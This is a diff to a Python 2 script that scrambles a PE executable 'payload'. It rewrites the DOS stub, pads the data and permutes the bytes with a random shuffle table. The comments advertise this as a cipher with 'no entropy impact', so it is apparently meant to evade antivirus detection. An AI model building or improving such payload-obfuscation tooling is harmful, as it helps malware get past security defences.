@@ -3,6 +3,13 @@ import random
 import sys
 import struct
 
+# Clean UP the standard PE Dos Stub
+# Implement the Bonneteau Cypher, no entropy impact
+# Variable Keylen
+# Ex :
+#    Key =  13402
+#    Data =  01234 56789
+#    Result = 1340268957
 
 if __name__ == '__main__':
   # Charge le payload
@@ -16,7 +23,7 @@ if __name__ == '__main__':
   except:
     print('** Error opening file')
     exit(1)
-
+  
   # Clean UP DOS Stub
   S = struct.Struct('<H')
   idxdospay = S.unpack_from(buffer(bytearray(payload[0x18:0x18+2])))[0] 
@@ -38,33 +45,41 @@ if __name__ == '__main__':
   for I in range(IDX,payload_len):
     dosstub[I:I+1] = payload[I:I+1]
   
+  
+  payload = dosstub 
+  
   # Choisis une taille de BBOX de 128 a 256 bytes
   bboxlen = random.randrange(128)+128
   print ('* BBox Len: %d' % bboxlen)
+
 
   # Genere le BBox Array
   bboxarray=[]
   for i in range(0,bboxlen):
     bboxarray.append(i)
   random.shuffle(bboxarray)
+  print bboxarray
 
   opayload = bytearray(bboxarray)
 
   fullrow = payload_len // bboxlen 
   restrow = payload_len % bboxlen
 
-  print ('* Process %dx%d bytes row and %d bytes' % (fullrow,bboxlen,restrow)) 
+  print ('* Ready to Process %dx%d bytes row and %d bytes' % (fullrow,bboxlen,restrow)) 
+  print ('* Adding %d padding bytes' % (bboxlen-restrow))
+  for i in range(0,bboxlen-restrow):
+    payload.append(0x00)
+
+  payload_len = payload_len + (bboxlen- restrow)
+  fullrow = payload_len // bboxlen 
+  restrow = payload_len % bboxlen
   
- # opayload = []
+  print ('* Final Process %dx%d bytes row and %d bytes' % (fullrow,bboxlen,restrow)) 
   
   for BBraw in range(0,fullrow):
     for I in bboxarray:
       opayload.append(payload[(BBraw*bboxlen)+I])
 
-  for J in range(0,restrow):
-      I = bboxarray[J]
-      opayload.append(payload[(BBraw*bboxlen)+I])
-  
   out = bytearray(opayload)
   
   with open('payload.bin',"w") as f:
